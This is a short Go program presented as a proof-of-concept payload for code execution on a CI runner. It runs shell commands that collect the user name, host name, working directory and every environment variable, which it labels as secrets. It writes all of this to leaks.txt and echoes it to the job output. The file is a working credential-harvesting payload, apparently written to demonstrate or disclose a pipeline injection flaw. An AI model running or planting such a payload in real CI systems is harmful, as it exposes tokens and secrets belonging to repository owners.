package main

import (
	"log"
	"os"
	"os/exec"
)

func main() {
	log.Println("PoC Payload: Starting data exfiltration...")

	// The shell commands to execute on the CI runner
	cmd_str := `
          echo "✅ PoC RCE EXECUTED SUCCESSFULLY" > leaks.txt
          echo "===================================" >> leaks.txt
          echo "== WHOAMI ==" >> leaks.txt
          whoami >> leaks.txt
          echo "" >> leaks.txt
          echo "== HOSTNAME ==" >> leaks.txt
          hostname >> leaks.txt
          echo "" >> leaks.txt
          echo "== PWD ==" >> leaks.txt
          pwd >> leaks.txt
          echo "" >> leaks.txt
          echo "== ENVIRONMENT VARIABLES (SECRETS) ==" >> leaks.txt
          env | sort >> leaks.txt
          echo "" >> leaks.txt
          echo "===================================" >> leaks.txt
          echo "✅ Data exfiltration complete." >> leaks.txt
  `

	// Execute the command
	cmd := exec.Command("sh", "-c", cmd_str)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		log.Fatalf("PoC Payload failed: %v", err)
	}

	log.Println("PoC Payload: Successfully wrote leaked data to leaks.txt")
}
